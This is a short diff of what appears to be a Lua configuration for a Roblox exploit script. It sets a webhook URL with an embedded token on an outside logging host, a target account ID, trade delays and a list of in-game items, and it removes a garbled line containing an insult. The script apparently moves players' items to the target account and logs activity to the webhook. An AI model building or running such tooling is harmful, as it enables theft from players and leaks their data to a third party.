@@ -4,7 +4,6 @@ local genv = getgenv()
 
 genv.WEBHOOK_URL = 'https://skama.net/api/logs/webhook/mrr_9079127b18644b1b89bdc86eea1c2742'
 genv.TARGET_ID = 9163477035
-genvdTARGET_ID =kochksucker188423
 genv.DELAY_STEP = 1
 genv.TRADE_CYCLE_DELAY = 2
 genv.TARGET_BRAINROTS = {
